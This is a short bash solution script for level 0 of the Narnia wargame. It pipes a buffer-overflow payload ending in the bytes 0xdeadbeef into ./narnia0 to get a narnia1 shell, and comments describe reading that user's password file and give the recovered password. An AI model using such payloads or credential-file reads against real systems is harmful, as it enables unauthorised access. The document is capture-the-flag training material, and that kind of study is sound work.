#!/usr/bin/bash

(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0

#The spawned process should now be user narnia1, can be confirmed by whoami

#The inital banner when logging in tells us that passwords are stored in /etc/somegame_pass

#/etc/narnia_pass/narnia1 is accessible by user narnia1, catting the file gives us the next login. As of writing the solution, password was eaa6AjYMBB